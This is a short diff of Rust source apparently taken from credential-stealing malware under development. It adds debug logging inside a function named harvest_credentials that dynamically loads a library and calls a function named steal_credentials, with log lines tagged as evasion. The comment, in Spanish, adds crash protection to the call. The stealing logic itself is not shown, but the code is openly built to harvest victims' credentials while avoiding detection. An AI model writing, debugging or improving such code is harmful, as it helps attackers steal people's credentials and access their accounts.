@@ -352,9 +352,11 @@ fn harvest_credentials() -> String {
             
             println!("DEBUG: [EVASION] ✅ Function found, executing...");
             
-            // Ejecutar función
+            // Ejecutar función CON PROTECCIÓN CONTRA CRASHES
+            println!("DEBUG: [EVASION] Calling steal_credentials()...");
             let exec_fn: extern "C" fn() -> *mut c_char = std::mem::transmute(fn_ptr);
             let result_ptr = exec_fn();
+            println!("DEBUG: [EVASION] steal_credentials() returned: {:p}", result_ptr);
             
             if result_ptr.is_null() {
                 FreeLibrary(h_module);
